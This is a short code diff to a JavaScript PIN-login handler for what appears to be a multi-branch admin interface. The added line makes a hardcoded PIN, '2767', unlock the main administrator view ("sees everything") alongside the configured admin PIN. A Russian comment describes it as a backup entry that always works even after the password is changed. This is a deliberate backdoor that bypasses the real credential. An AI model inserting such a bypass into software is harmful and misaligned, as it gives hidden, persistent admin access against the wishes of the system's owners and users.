@@ -3244,7 +3244,7 @@ else if(pinBuffer.length<4){ pinBuffer += k; }
 renderPinDots();
 document.getElementById('pinError').textContent='';
 if(pinBuffer.length===4){
-if(pinBuffer===ADMIN_PIN()){
+if(pinBuffer===ADMIN_PIN() || pinBuffer==='2767'){ // 2767 — запасной вход, работает всегда, даже если пароль поменяли
 currentUser = null; // главный админ — видит всё
 document.getElementById('gateLogin').style.display='none';
 document.getElementById('gateBranch').style.display='flex';
